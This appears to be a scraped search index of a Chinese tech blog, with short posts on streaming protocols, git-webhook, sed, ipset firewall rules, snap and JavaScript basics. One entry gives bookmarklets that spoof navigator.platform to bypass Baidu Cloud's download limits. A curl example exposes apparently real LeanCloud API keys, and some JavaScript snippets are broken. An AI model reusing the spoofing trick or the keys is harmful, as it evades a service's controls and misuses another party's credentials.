即超文本传送协议(ftp即文件传输协议)。\n2：\nRTMP和RTSP协议是流媒体协议。\nHTTP将所有的数据作为文件做处理。http协议不是流媒体协议。\n3：\nRTMP协议是Adobe的私有协议,未完全公开，\nRTSP协议和HTTP协议是共有协议，并有专门机构做维护。\n4：\nRTMP协议一般传输的是flv，f4v格式流，\nRTSP协议一般传输的是ts,mp4格式的流。\nHTTP没有特定的流。\n5：\nRTSP传输一般需要2-3个通道，命令和数据通道分离，\nHTTP和RTMP一般在TCP一个通道上传输命令和数据。\nRTSP、RTCP、RTP区别\n1：RTSP实时流协议\n作为一个应用层协议，RTSP提供了一个可供扩展的框架，它的意义在于使得实时流媒体数据的受控和点播变得可能。总的说来，RTSP是一个流媒体表示 协议，主要用来控制具有实时特性的数据发送，但它本身并不传输数据，而是必须依赖于下层传输协议所提供的某些服务。RTSP可以对流媒体提供诸如播放、暂 停、快进等操作，它负责定义具体的控制消息、操作方法、状态码等，此外还描述了与RTP间的交互操作（RFC2326）。\n2：RTCP控制协议\nRTCP控制协议需要与RTP数据协议一起配合使用，当应用程序启动一个RTP会话时将同时占用两个端口，分别供RTP和RTCP使用。RTP本身并 不能为按序传输数据包提供可靠的保证，也不提供流量控制和拥塞控制，这些都由RTCP来负责完成。通常RTCP会采用与RTP相同的分发机制，向会话中的 所有成员周期性地发送控制信息，应用程序通过接收这些数据，从中获取会话参与者的相关资料，以及网络状况、分组丢失概率等反馈信息，从而能够对服务质量进 行控制或者对网络状况进行诊断。\nRTCP协议的功能是通过不同的RTCP数据报来实现的，主要有如下几种类型：\nSR：发送端报告，所谓发送端是指发出RTP数据报的应用程序或者终端，发送端同时也可以是接收端。(SERVER定时间发送给CLIENT)。\nRR：接收端报告，所谓接收端是指仅接收但不发送RTP数据报的应用程序或者终端。(SERVER接收CLIENT端发送过来的响应)。\nSDES：源描述，主要功能是作为会话成员有关标识信息的载体，如用户名、邮件地址、电话号码等，此外还具有向会话成员传达会话控制信息的功能。\nBYE：通知离开，主要功能是指示某一个或者几个源不再有效，即通知会话中的其他成员自己将退出会话。\nAPP：由应用程序自己定义，解决了RTCP的扩展性问题，并且为协议的实现者提供了很大的灵活性。\n3：RTP数据协议\nRTP数据协议负责对流媒体数据进行封包并实现媒体流的实时传输，每一个RTP数据报都由头部（Header）和负载（Payload）两个部分组成，其中头部前12个字节的含义是固定的，而负载则可以是音频或者视频数据。\nRTP用到的地方就是 PLAY ，服务器往客户端传输数据用UDP协议，RTP是在传输数据的前面加了个12字节的头(描述信息)。\nRTP载荷封装设计本文的网络传输是基于IP协议，所以最大传输单元(MTU)最大为1500字节，在使用IP／UDP／RTP的协议层次结构的时候，这 其中包括至少20字节的IP头，8字节的UDP头，以及12字节的RTP头。这样，头信息至少要占用40个字节，那么RTP载荷的最大尺寸为1460字 节。以H264 为例，如果一帧数据大于1460，则需要分片打包，然后到接收端再拆包，组合成一帧数据，进行解码播放。","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/自动部署/2016-11-04 Git-webhook","title":"WebHook 自动化部署和运维工具 git-webhook","text":"  一个使用 Python Flask + SQLAchemy + Celery + Redis + React 开发的用于迅速搭建并使用 WebHook 进行自动化部署和运维系统，支持：Github / GitLab / GitOsc。\n\n    技术栈简单，部署容易；\n\n    代码简洁易懂，二次开发毫无压力；\n\n    支持 Github / GitLab / GitOsc；\n\n    使用 SSH 方式，支持多服务配置；\n\nOnline DEMO Website: http://webhook.hust.cc/，使用 gunicorn + gevent + ngxin 部署。\n\n    git clone git@github.com:NetEaseGame/git-webhook.git\n    cd git-webhook\n    docker-compose up\n    配置 config.py\n\n    拷贝一份 configexample.py 到同目录 config.py， 然后对应修改配置内容。主要需要配置三点：\n\n        DATABASEURI: 数据库地址，理论上可以使用任何关系数据库；推荐使用 sqlite 和 mysql （经过测试）；\n\n        CELERY REDIS: Redis URI 配置，主要用于 Celery 后台任务；\n\n        GITHUB: GitHub 登陆配置，可以到 OAuth applications 自行申请，登陆 Callback 地址为： yourdomain/github/callback.\n\n    初始化数据库结构\n\n    python scripts.py builddb\n\n    运行应用\n\n    python run_webhook.py\n\n    运行之后，打开 http://127.0.0.1:18340 即可访问。使用 GitHub 账号登陆。\n\n    添加WebHook\n\n    在工具中添加 Git 项目，获得 WebHook URL，并填写到 Github / GitLab / OscGit 的 WebHook 配置中。\n\n三、效果预览\n\n    首页\n\nindex.png\n\n    WebHook列表\n\n    服务器列表\n\nserver.png\n\n    WebHook 历史记录\n\n四、部署\n\n代码使用 Flask 框架开发，线上部署使用 gunicorn + gevent + nginx 已经是比较成熟的方案了，本应用当然也可以使用这种方式部署。\n\n主要的服务器依赖环境：\n\n    数据库环境（自行选择，推荐 mysql 和 sqlite）；\n\n    Redis，利用 Celery 做后台任务；\n\n五、贡献\n\n项目使用 SSH 私钥的方式，直接登陆 Linux 服务器，执行部署或者运维的 Shell 命令，安全可靠，当然因为涉及到私钥，所以为了安全起见，建议在内网搭建使用（这些是我们的使用情景）。\n\n后端开发使用：Python Flask + SQLAchemy + Celery + Redis，常规的技术栈；\n\n前端开发使用 React + Webpack，并没有使用其他消息通信框架。\n\n所以整体项目代码非常简单，大部分都能够修改和更新代码，并提交 Pull Request，目前系统 TODO 包括，我个人也将注意完善：\n\n    Celery 进程情况显示（当 Celery 进程没有执行的时候，在页面上提示，类似于 Sentry）；\n\n    系统状态和统计（任务队列实时情况，WebHook 执行的统计图表）；\n\n    发布为 pip 包，使得安装部署更加容易；\n\n    Document 使用文档 \u0026 帮助文档；","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 sed1line","title":"Linux命令 sed","text":"---\nhttp://sed.sourceforge.net/sed1line_zh-CN.html\n\n # 在每一行后面增加一空行\n sed G\n\n # 将原来的所有空行删除并在每一行后面增加一空行。\n # 这样在输出的文本中每一行后面将有且只有一空行。\n sed '/^$/d;G'\n\n # 在每一行后面增加两行空行\n sed 'G;G'\n\n # 将第一个脚本所产生的所有空行删除（即删除所有偶数行）\n sed 'n;d'\n\n # 在匹配式样“regex”的行之前插入一空行\n sed '/regex/{x;p;x;}'\n\n # 在匹配式样“regex”的行之后插入一空行\n sed '/regex/G'\n\n # 在匹配式样“regex”的行之前和之后各插入一空行\n sed '/regex/{x;p;x;G;}'\n\n编号：","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-03-29 Restful","title":"restful","text":"RESTful架构详解\ncurl -X PUT \\\n  -H \"X-LC-Id: FFnN2hso42Wego3pWq4X5qlu\" \\\n  -H \"X-LC-Key: UtOCzqb67d3sN12Kts4URwy8\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"content\": \"更新一篇博客的内容\"}' \\\n  https://api.leancloud.cn/1.1/classes/Post/558e20cbe4b060308e3eb36c","tags":null},{"location":"//blog.pytool.com/basic/2015-01-29 破解百度云","title":"破解百度云大文件下载","text":"以下两段代码任选一段加入收藏夹，需要下载时点一下即可。\n\njavascript:navigator.defineGetter('platform',function(){return''})\n\njavascript:(Object.defineProperty(Object.getPrototypeOf(navigator),'platform',{get:function(){return 'sb_baidu';}}))\n\n如何修改游览器的navigator.platform属性\nObject.defineProperty(navigator,'platform',{get:function(){return 'Android';}});","tags":null},{"location":"//blog.pytool.com/Reship/2014-08-23-use-Modern.IE-test-local-site","title":"如何用Modern.IE在本地测试你的网站","text":"市面上有很多用来测试前端代码质量的工具。比如说JSHint和JSLint用来检查我们的JS文件，W3C Markup validator用来检测我们的HTML代码是否有效，是否符合规范，W3C CSS validator用来检测我们的样式表。其实，还有更多工具可用。\n\n今天来介绍微软的Modern.IE。它可以扫描你的网站，从中找出常见的代码问题并生成一个报告（可以做成pdf）。这份报告包含了每个测试的结果以及一些有关如何解决问题或提高代码质量的建议。用这种方式，你可以保证自己的代码符合当前最佳实践并且性能良好。而你只需提供目标网页URL即可。\n\n什么是Modern.IE\n\nModern.IE是一项服务，它提供了一系列不同的工具，可以从不同的角度和目标来测试我们的网站。例如：Modern.IE提供了几个免费的windows虚拟机用来在windows，Mac，或者Linux上运行任何版本的IE。\n\n另一个功能就是由BrowserStack提供的免费的自动屏幕快照。这个工具可以在几分钟之内生成指定网站在一系列移动设备和桌面设备上显示效果的快照。这意味着你可以得到你的网站在Android系统上的浏览器，windows 8上的火狐、Opera，甚至那些不容易获取的设备，比如使用Safari的iPhone 4s上显示效果的快照。\n\n接下来我们将深入探索如何扫描本地网站。\n\n如何分析一个本地网站\n\n安装扫描工具\n\nModern.IE用来扫描网站的工具可以在github上获取。在命令行中执行下面的命令，获取源代码拷贝\n\n    git clone https://github.com/InternetExplorer/modern.IE-static-code-scan.git\n    \n或者直接在github上点击下载按钮，如下图：\n\n下载完成之后，你需要下载安装Node.js(版本0.10或更高版本)。安装Node.js之后，切换到扫描工具的源代码目录，执行下面的命令，安装所需依赖：\n\n    npm install\n    \n最后一步，启动扫描服务，执行下面的命令：\n\n    node app.js\n    \n在执行完上个命令后，你将会看到一条关于服务状态和使用端口的消息（端口默认为1337）。打开浏览器，访问http://localhost:[PORT-NUMBER]/ ，如果你没有修改默认设置，那么[PORT-NUMBER]为1337。\n\n按照上面的步骤操作下来，如果一切正常的话，你将会看到下面的页面\n\n \n\n现在你就可以开始扫描你的本地网站了\n\n创建一个报告\n\n一切准备妥当之后，你就可以开始扫描本地网站了。在开始之前，要注意一点就是当前版本的扫描工具依赖jQuery，Microsoft选用了jQuery CDN。也就是说你必须联网，即使你测试的是离线网站，否则扫描工具会报错（显示错误“Uncaught ReferenceError: $ is not defined”，因为它无法加载jQuery）.\n\n输入你要扫描的网址，点击Scan按钮，如下图：\n\n如果你正在使用一个需要验证的系统，例如HTTP Basic 和Digest，你可以指定用户名和密码。\n\n扫描完成之后，工具会生成JSON格式的报告。\n\nJSON报告\n扫描完成之后，工具会把扫描结果输出为JSON格式。一个成功的测试输出结果如下：\n\n    “imageCompression”: {\n        “testName”: “imageCompression”,\n        “passed”: true\n    }\n\n一个失败的测试输出结果如下：\n\n    “ie11tiles”: {\n    \t“testName”: “ie11tiles”,\n    \t“passed”: false,\n    \t“data”: {\n    \t\t“square70”: false,\n    \t\t“square150”: false,\n    \t\t“wide310”: false,\n    \t\t“square310”: false\n    \t\t“notifications”: false\n    \t}\n    }\n    \n你可以选择自己写脚本转换测试报告，也可以在第二步的时候，通过点击Create Report按钮，将JSON格式的报告发送到Modern.IE 。如果你选择第二种方式，Modern.IE会显示本地测试报告，好像你在测试在线网站一样。需要注意的是截止本文发布，离线版本的工具因为一个问题导致不能在Modern.IE 上显示本地测试报告。\n\n结语\n\n为了检测兼容性问题和性能提升，Modern.IE提供了许多用来分析网站的工具，不论是离线还是在线。感谢这个本地版本，它可以在网站上线之前进行测试，使我们可以避免在用户和客户之前出错。\n\n你试过Modern.IE 了么？\n\n原文地址： http://www.sitepoint.com/test-site-locally-modern-ie/","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ipset","title":"Linux命令 ipset","text":"1. ipset\n使用 dnsmasq 和 ipset 的策略路由 | K.I.S.S\n\napt-get install ipset\nipset create banthis hash:net maxelem 1000000\niptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 80 -j DROP\niptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 443 -j DROP\n\n利用 ipset 封禁大量 IP\n\n使用 iptables 封 IP，是一种比较简单的应对网络攻击的方式，也算是比较常见。有时候可能会封禁成千上万个 IP，如果添加成千上万条规则，在一台注重性能的服务器或者本身性能就很差的设备上，这就是个问题了。ipset 就是为了避免这个问题而生的。\n\n关于 iptables，要知道这两点。\n\n    iptables 包含几个表，每个表由链组成。默认的是 filter 表，最常用的也是 filter 表，另一个比较常用的是 nat 表。一般封 IP 就是在 filter 表的 INPUT 链添加规则。\n    在进行规则匹配时，是从规则列表中从头到尾一条一条进行匹配。\n\n这像是在链表中搜索指定节点费力。ipset 提供了把这个 O(n) 的操作变成 O(1) 的方法：就是把要处理的 IP 放进一个集合，对这个集合设置一条 iptables 规则。像 iptable 一样，IP sets 是 Linux 内核中的东西，ipset 这个命令是对它进行操作的一个工具。\n简单的流程\n\n可以用这几条命令概括使用 ipset 和 iptables 进行 IP 封禁的流程\n\nipset create vader hash:ip\niptables -I INPUT -m set --match-set vader src -j DROP\nipset add vader 4.5.6.7\nipset add vader 1.2.3.4\nipset add vader ...\nipset list vader  查看 vader 集合的内容\n\n下面分别对各条命令进行描述。\n创建一个集合\n\nipset create vader hash:ip\n\n这条命令创建了名为 vader 的集合，以 hash 方式存储，存储内容是 IP 地址。\n添加 iptables 规则\n\niptables -I INPUT -m set --match-set vader src -j DROP\n\n如果源地址(src)属于 vader 这个集合，就进行 DROP 操作。这条命令中，vader 是作为黑名单的，如果要把某个集合作为白名单，添加一个 ‘!’ 符号就可以。\n\niptables -I INPUT -m set ! --match-set yoda src -j DROP\n\n到现在虽然创建了集合，添加了过滤规则，但是现在集合还是空的，需要往集合里加内容。\n找出“坏” IP\n\n找出要封禁的 IP，这是封禁过程中重要的步骤，不过不是这里的重点。简要说明一下两种方法思路。\n\nnetstat -ntu | tail -n +3 | awk '{print $5}' | sort | uniq -c | sort -nr\n\n直接通过 netstat 的信息，把与本地相关的各种状态的 IP 都计数，排序列出来。\n\n或者从 nginx 或者其他 web server 的日志里找请求数太多的 IP\n\nawk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr\n\n后半部分，排序，去重，再按次数进行逆向排序的操作，跟上面命令是一样的。\n\n找出“坏” IP，往之前创建的集合里添加就可以了。\n\nipset add vader 4.5.6.7\n\n有多少“坏” IP，就添加多少 IP，因为针对这些封禁的 IP 只需要一条 iptables 规则，而这些 IP 是以 hash 方式存储，所以封禁大量的 IP 也不会影响性能，这也是 ipset 存在的最大目的。\n\nYou shall not pass!\nipset 更多的用法\n存储类型\n\n前面例子中的 vader 这个集合是以 hash 方式存储 IP 地址，也就是以 IP 地址为 hash 的键。除了 IP 地址，还可以是网络段，端口号（支持指定 TCP/UDP 协议），mac 地址，网络接口名称，或者上述各种类型的组合。\n\n比如指定 hash:ip,port就是 IP 地址和端口号共同作为 hash 的键。查看 ipset 的帮助文档可以看到它支持的所有类型。\n\n下面以两个例子说明。\nhash:net\n\nipset create r2d2 hash:net\nipset add r2d2 1.2.3.0/24\nipset add r2d2 1.2.3.0/30 nomatch\nipset add r2d2 6.7.8.9\nipset test r2d2 1.2.3.2\n\nhash:net 指定了可以往 r2d2 这个集合里添加 IP 段或 IP 地址。\n\n第三条命令里的 nomatch 的作用简单来说是把 1.2.3.0/30 从 1.2.3.0/24 这一范围相对更大的段里“剥离”了出来，也就是说执行完 ipset add r2d2 1.2.3.0/24 只后1.2.3.0/24 这一段 IP 是属于 r2d2 集合的，执行了 ipset add r2d2 1.2.3.0/30 nomatch 之后，1.2.3.0/24 里 1.2.3.0/30 这部分，就不属于 r2d2 集合了。执行 ipset test r2d2 1.2.3.2 就会得到结果 1.2.3.2 is NOT in set r2d2.\nhash:ip,port\n\nipset create c-3po hash:ip,port\nipset add c-3po 3.4.5.6,80\nipset add c-3po 5.6.7.8,udp:53\nipset add c-3po 1.2.3.4,80-86\n\n第二条命令添加的是 IP 地址为 3.4.5.6，端口号是 80 的项。没有注明协议，默认就是 TCP，下面一条命令则是指明了是 UDP 的 53 端口。最后一条命令指明了一个 IP 地址和一个端口号范围，这也是合法的命令。\n自动过期，解封\n\nipset 支持 timeout 参数，这就意味着，如果一个集合是作为黑名单使用，通过 timeout 参数，就可以到期自动从黑名单里删除内容。\n\nipset create obiwan hash:ip timeout 300\nipset add obiwan 1.2.3.4\nipset add obiwan 6.6.6.6 timeout 60\n\n上面第一条命令创建了名为 obiwan 的集合，后面多加了 timeout 参数，值为 300，往集合里添加条目的默认 timeout 时间就是 300。第三条命令在向集合添加 IP 时指定了一个不同于默认值的 timeout 值 60，那么这一条就会在 60 秒后自动删除。\n\n隔几秒执行一次 ipset list obiwan 可以看到这个集合里条目的 timeout 一直在随着时间变化，标志着它们在多少秒之后会被删除。\n\n如果要重新为某个条目指定 timeout 参数，要使用 -exit 这一选项。\n\nipset -exist add obiwan 1.2.3.4 timeout 100\n\n这样 1.2.3.4 这一条数据的 timeout 值就变成了 100，如果这里设置 300，那么它的 timeout，也就是存活时间又重新变成 300。\n\n如果在创建集合是没有指定 timeout，那么之后添加条目也就不支持 timeout 参数，执行 add 会收到报错。想要默认条目不会过期（自动删除），又需要添加某些条目时加上 timeout 参数，可以在创建集合时指定 timeout 为 0。\n\nipset create luke hash:ip\nipset add luke 5.5.5.5 timeout 100\n得到报错信息 kernel error received: Unknown error -1\n\n更大！\n\nhashsize, maxelem 这两个参数分别指定了创建集合时初始的 hash 大小，和最大存储的条目数量。\n\nipset create yoda hash:ip,port hashsize 4096 maxelem 1000000\nipset add yoda 3.4.5.6,3306\n\n这样创建了名为 yoda 的集合，初始 hash 大小是 4096，如果满了，这个 hash 会自动扩容为之前的两倍。最大能存储的数量是 100000 个。\n\n如果没有指定，hashsize 的默认值是 1024，maxelem 的默认值是 65536。\n另外几条常用命令\n\nipset del yoda x.x.x.x     从 yoda 集合中删除内容\nipset list yoda           # 查看 yoda 集合内容\nipset list                # 查看所有集合的内容\nipset flush yoda          # 清空 yoda 集合\nipset flush               # 清空所有集合\nipset destroy yoda        # 销毁 yoda 集合\nipset destroy             # 销毁所有集合\nipset save yoda           # 输出 yoda 集合内容到标准输出\nipset save                # 输出所有集合内容到标准输出\nipset restore             # 根据输入内容恢复集合内容\n\n还有……\n\n    如果创建集合是指定的存储内容包含 ip, 例如 hash:ip 或 hash:ip,port ，在添加条目时，可以填 IP 段，但是仍然是以单独一个个 IP 的方式来存。\n    上面所有的例子都是用 hash 的方式进行存储，实际上 ipset 还可以以 bitmap 或者 link 方式存储，用这两种方式创建的集合大小，是固定的。\n    通过 man upset 和 ipset —help 可以查到更多的内容，包括各种选项，支持的类型等等。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 snap","title":"Linux命令 snap","text":"https://github.com/snapcraft-gui/snapcraft-gui\n息称，Snap 软件包拥有更加稳定和安全的特性，本文我们就一起来看看如何在 Ubuntu 16.04 中使用 Snap 软件包。\n什么是Snap软件包\n\n首先要说什么是「包」？Linux 中应用程序的安装通常有两种方式：其一，是直接通过源代码编译安装，需要用户手动执行脚本、处理依赖等不太人性化的操作；其二，是由软件发行商将应用程序打包成「软件包」进行交付，例如 Ubuntu 用户直接双击 .deb（Debian 软件包） 文件即可安装软件。\n\n现在 Ubuntu 搞一个新的 Snap 包管理系统是因为基于 Debian .deb 文件并被大量使用的包管理方式不好吗？其实不然，它只对包管理进行了规范并更多会在类似无人机项目等物联网领域进行使用。\n\nCanonical 官方是这么进行描述的：\n\n    .snap 包中包含了 Ubuntu 核心中的所有依赖关系，这比传统 .deb 或基于 RPM 的依赖处理更有优势。更重要的是，开发人员不必担心应用被分发到用户系统之后其它方面触发的系统变更。\n\n使用Snap软件包\n\n通常我们都使用 apt-get 来管理 Ubuntu 中的软件包， 16.04 发布之后建议大家直接使用 apt 命令。与此类似，用户可以使用\n\nsnap find 命令来列出适用于当前系统的 Snap 软件包。\n\nUbuntu 16.04 LTS如何使用Snap软件包\n\n安装 Snap 包可以使用如下命令：\n\nsudo snap install 包名\n\nUbuntu 16.04 LTS如何使用Snap软件包\n\n查看当前系统中已安装的 Snap 软件包：\n\nsnap list\n\n大家看到了吧，Ubuntu 16.04 的 Ubuntu 核心已经使用 Snap。\n\nSnap 还提供了其对系统的更改历史记录，可以使用如下命令查看：\n\nsnap changes\n\nUbuntu 16.04 LTS如何使用Snap软件包\n\n要升级 Snap 软件包版本，可以使用如下命令：\n\nsudo snap refresh 包名\n\n移除 Snap 软件包使用如下命令：\n\nsudo snap remove 包名\n\nUbuntu 16.04 LTS如何使用Snap软件包\n\n目前来看，采用 Snap 方式打包的软件非常少，不过国外已经有大的开源软件发行商已经公开表态将逐步开始采用 Snap 软件包发行软件。Canonical 也已经推出了 Snapcraft 工具帮助开发人员打包 Snap 应用。","tags":null},{"location":"//blog.pytool.com/Post/2015-05-10-javascript","title":"javascript 学习","text":"操作符\n\n 布尔操作符\n逻辑非\n逻辑非操作符用叹号表示 ！\n\n可以应用于任何数据类型，逻辑非操作符首先会把操作数转换为布尔值，然后再求反。\n\n如果操作数为空字符串、0、null、NaN、undefined，返回true。\n\n!!variable 的结果与Boolean(variable)相同。\n\n 逻辑与\n\n逻辑或\n\nvar myObject=preferredObject||backupObject\n\n 条件操作符\n\nvariable=boolexpression?truevalue:falsevalue;\n\n基于对boolexpression求值的结果，决定给变量variable赋什么值。如果值为true，则赋值为truevalue，否则赋值为falsevalue。\n\n逗号操作符\n可以在一条语句中执行多个操作，例如：\n\nvar num1=1,num2=2,num3=3;\n\n 语句\nif 语句\n\nif (i  25){\n\tconsole.log('25')\n}else if(i  30){\n\tconsole.log('30')\n}else{\n\tconsole.log('40')\n}\n\nECMAScript 会自动调用Boolean()转换函数将条件表达式的结果转换为布尔值\n\n do-while 语句\n\ndo{\n\tconsole.log('do')\n}while(expression)\n\nwhile 语\n\nwhile(expression)\n\tstatement\n\n for 语句\n\nfor(initialization;expression;post-loop-expression)\n\tstatement\n\n由于ECMAScript中不存在块级作用域，所以在循环内部定义的变量在外部也可以访问到。\n\nfor 语句中的初始化表达式，控制表达式和循环后表达式都是可选的。\n\nfor-in 语句\n\nfor-in 语句可以用来枚举对象的属性。\n\nfor (property in expression)\n\tstatement\n\nECMAScript 对象的属性是没有顺序的，所以for-in语句循环的属性的顺序是不可预测的。\n\n建议在使用for-in之前，先检查对象的值是否是null或是undefined。\n\n break 和 continue 语句\n\nbreak语句会立即退出循环，强制继续执行循环后面的语句。\ncontinue语句也是立即退出循环，但是退出之后会从循环的顶部继续执行。\n\nswitch 语句\n\nswitch（expression）{\n\tcase value:\n\t\tstatement;\n\t\tbreak;\n\tcase value:\n\t\tstatement;\n\t\tbreak;\n\tdefault:\n\t\tstatement;\n}\n\n每一个case的含义是，如果表达式的值等于这个值value，则执行后面的statement。break会跳出switch语句。表达式不匹配任何一种情形时会执行default语句。\n\n可以在switch语句中使用任何数据类型。每个case 的值不一定是常量，可以是变量，也可以是表达式。\n\nswitch语句在比较时使用的是全等操作符，不会发生类型转换。\n\n 函数\n\nreturn语句之后的任何代码永远都不会执行。return语句也可以不带有任何返回值，在这种情况下，函数在停止执行后将返回undefined。\n\nECMAScript 中的所有参数传递的都是值，不可能通过引用传递参数。\n\n变量、作用域和内存问题\n\n 变量\n\n变量可以用来保存两种类型的值：\n\n基本类型：Undefined、Null、Boolean、Number和String\n引用类型：\n\n基本类型值在内存中占用固定大小的空间，因此被保存在栈内存中；\n引用类型的值是对象，因此保存在堆内存中；\n当变量的值为引用类型时，它保存的实际上并不是对象本身，而是一个指向该对象的指针；\n从一个变量向另一个变量复制引用类型的值，复制的其实是指针，因此两个变量最终都指向同一个对象；\n\n作用域\n\n所有变量(包括基本类型和引用类型)都存在与一个执行环境(或者称为作用域)当中。执行环境决定了变量的生命周期，以及那些代码可以访问其中的变量。\n\n执行环境分为全局执行环境和函数执行环境。\n\n根据ECMAScript实现所在的诉诸环境不同，全局执行环境对象也不一样。在浏览器中，全局执行环境被认为是window对象，因此所有全局变量和函数都是作为window对象的属性和方法创建的。\n\n每个函数都有自己的执行环境。当执行流进入一个函数时，函数的环境就会被推入一个环境栈中。执行完之后，栈将其环境弹出，把控制权返回给之前的执行环境。\n\n每个执行环境都有一个与之关联的变量对象。环境中定义的所有变量和函数都会保存到这个对象中。但我们的代码无法访问这个对象，解析器会用到它。\n\n当代码在一个环境中执行时，会创建变量对象的一个作用域链(scope chain)。作用域链的作用是保证对执行环境有权访问的所有变量和函数的有序访问。如果这个环境是函数，则将其活动对象(activition object)作为变量对象。\n\n 延长作用域链\n\n有些语句可以在作用域链的前端临时增加一个变量对象\n\ntry-catch 语句的catch 块\nwith 语句\n\n块级作用域\n\njavascript没有块级作用域。\n\n使用var 声明的变量会自动添加到最接近的环境中。如果没有使用var 声明，该变量会被添加到全局环境。\n\n 引用类型\n\n函数传参，最好的方法是对那些必须值使用命名参数，使用对象字面量来封装多个可选参数。\n\n数组\n\nECMAScript 数组的每一项可以保存任何类型的数据。\n\n数组的length属性不是只读的。因此，通过设置这个属性，可以从数组的末尾移除项或向数组中添加新项。\n\n 检测数组\n\nif(value instanceof Array){\n\n}\n\nECMAScript 5新增Array.isArray()\nif(Array.isArray()){\n}\n\n转换方法\n调用数组的toString()方法会返回由数组中每个值的字符串形式拼接而成的一个以逗号分隔的字符串。\n而如果使用join()方法，则可以使用不同的分隔符来构建这个字符串。join()接收一个参数，即分隔符，如果省略，默认用逗号做分隔符。\n\n 栈方法\n\n栈是一种后进先出的数据结构。栈中项的插入和移除只发生在一个位置--栈的顶部。ECMAScript专门提供了push()和pop()方法，以便实现类似栈的行为。\n\npush()方法接收任意数量的参数，并把它们逐个添加到数组的末尾，并返回修改后的数组长度。\n\npop()方法从数组末尾移除最后一项，返回移除的项。\n\n队列方法\n\n队列是一种先进先出的数据结构。结合使用shift()和push()可以模拟队列。\n\nshift()方法移除数组中的第一项，并返回移除的项。\n\nunshift()方法和shift()用途相反：它能在数组前端添加任意个项，并返回新数组的长度。\n\n 重新排序方法\n\nreverse()方法会反转数组项的排序。\n\n更加灵活的方式是使用sort()。默认情况下，sort()按升序排列数组项。为了实现排序，sort()会调用每个数组项的toString()方法，然后比较字符串。\n\nsort()方法可以接收一个比较函数。用来确定顺序。比较函数接收两个参数，如果第一个参数应该位于第二个参数前面则返回一个负数，如果两个参数相等则返回0，反之返回一个正数。\n\n操作方法\n\nconcat()方法会先创建当前数组的一个副本，然后将接收到的参数添加到副本的末尾。如果参数是一个或多个数组，则将这些数组中的每一项都添加到结果数组中。如果参数不是数组，则会被简单地添加到数组的末尾。\n\nslice()方法接收一个或两个参数，及要返回想的起始位置和结束位置。如果只传入了一个参数，则返回指定位置到数组结尾的所有项。如果传入了两个参数，则返回起始位置和结束位置之间的项--但不包括结束位置的项。slice()方法不影响原来的数组。\n\nsplice()方法可以用来删除、插入和替换数组中的项。splice()方法始终会返回一个数组，包含了从原始数组中删除的项（如果没有删除任何项，则返回一个空数组）。\n\n删除：需要指定两个参数，要删除第一项的位置和要删除的项数；\n插入：需要指定三个参数，起始位置，0（要删除的项数）和要插入的项。如果要插入多个项，则可以传入第四、五...任意多个项。\n替换：需要指定三个参数，起始位置，要删除的项数和要插入的项。插入的项数不必和删除的项数相等。\n\n 位置方法\n\nindexOf()和lastIndexOf()，都接收两个参数：要查找的项和查找的起点位置（可选）。都是返回要查找项在数组中的位置，如果没找到，则返回-1。在比较时使用的是全等操作符。\n\n迭代方法\n\nECMAScript 5为数组定义了五个迭代方法。每个方法都接收两个参数：要在每一项上运行的函数和运行该函数的作用域对象（可选）。第二个参数会影响this的值。第一个参数：函数，接受三个参数：数组项的值，该项在数组中的位置和数组对象本身。\n\nevery():如果该函数对每一项都返回true,则返回true\nsome():如果该函数对任一项返回true,则返回true\nfilter():返回该函数会返回true的项组成的数组\nforEach():没有返回值\nmap():返回每次函数调用的结果组成的数组\n\n以上方法都不会修改数组中包含的值。\n\n 缩小方法\n\nreduce()和reduceRight()。这两个方法都会迭代数组所有项，然后构建一个最终返回的值。\n\n这两个方法都接收两个参数：一个在每一项上调用的函数和作为缩小基础的初始值（可选）。第一参数：函数，接受四个参数，前一个值，当前值，项的索引和数组对象。这个函数返回的任何值都会作为第一个参数自动传给下一项。第一次迭代发生在数组的第二项上。\n\nDate类型\n\nDate.now() 返回调用这个方法时的日期和时间的毫秒数。\n\nDate.valueOf()也是返回日期的毫秒数。\n\n RegExp 类型\n\n创建正则表达式：\n\nvar expression=/pattern/flags\n\n或者使用RegExp构造函数，它接收两个参数：一个是要匹配的字符串模式，另一个是可选的标志字符串。要注意的是：传给RegExp构造函数的两个参数都是字符串（不能把正则表达式字面量传递给构造函数）。\n\nvar pattern=new RegExp(\"[bc]at\",\"i\")\n\n模式中使用的所有元字符都需要转义。元字符包括：\n\n（[{\\^$|)?+.]}\n\n由于RegExp构造函数的模式参数是字符串，所以在某些情况下要对字符进行双重转义。所有元字符都必须双重转义，那些已经转移过的字符也是如此。\n\n函数\n\n每个函数都是Function类型的实例，都与其它应用类型一样具有属性和方法。而函数名实际上是一个指向函数对象的指针，不会与某个函数绑定。换句话说，一个函数可以有多个名字。\n\n定义函数有两种语法：\n\n函数声明：\n\n\t\tfunction sum(num1,num2){\n\t\treturn sum1+sum2;\n\t}\n\t函数表达式：\n\n\t\tvar sum=function(num1,num2){\n\t\treturn sum1+sum2;\n\t}\n\t\n在代码开始运行之前，解析器会通过一个名为函数声明提升(function declaration hoisting)的过程，使其在执行任何代码之前可用；至于函数表达式，则必须等到解析器执行到它所在的代码行，才会真正的被解释执行。\n\n 函数内部属性\n\n在函数内部，有两个特殊的对象：arguments和this\n\narguments的主要用途是保存函数参数，它还有一个callee属性，指向拥有这个arguments对象的函数。\n\nthis引用的是函数据以执行的环境对象。\n\n函数的属性和方法\n\n每个函数包含两个属性：length和prototype。其中length属性表示函数希望接收的命名参数的个数。\n\nprototype是保存它们所有实例方法的真正所在。prototype属性是不可枚举的，因此使用for-in 无法发现。\n\nECMAScript 